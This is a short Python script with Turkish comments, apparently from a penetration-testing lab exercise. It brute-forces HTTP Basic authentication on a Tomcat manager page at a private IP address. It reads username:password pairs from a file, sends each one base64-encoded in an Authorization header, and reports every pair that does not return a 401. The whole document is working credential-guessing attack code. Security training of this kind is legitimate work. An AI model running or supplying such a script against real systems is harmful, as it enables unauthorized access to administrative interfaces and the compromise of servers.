# Http Basic Authentication

import requests
import base64


# password headers'ta authorization yanında base64 encode edilmiş haldedir


url = "http://10.0.2.6:8180/manager/html"


f = open ( "user_password.txt" , "r")


for credentials in f :
	# print(credentials.strip())
	encoded = base64.b64encode ( credentials.strip().encode() )

	# decode halini ekrana yazdırma
	# print (encoded.decode() )  


	headers = { 'Authorization' : 'Basic ' + encoded.decode() }
	response = requests.get( url , headers=headers)

	# Gelen status code'larını yazdırmak
	# print ( response.status_code)

	if int(response.status_code) != 401 :
		print("Success ", credentials.strip() )


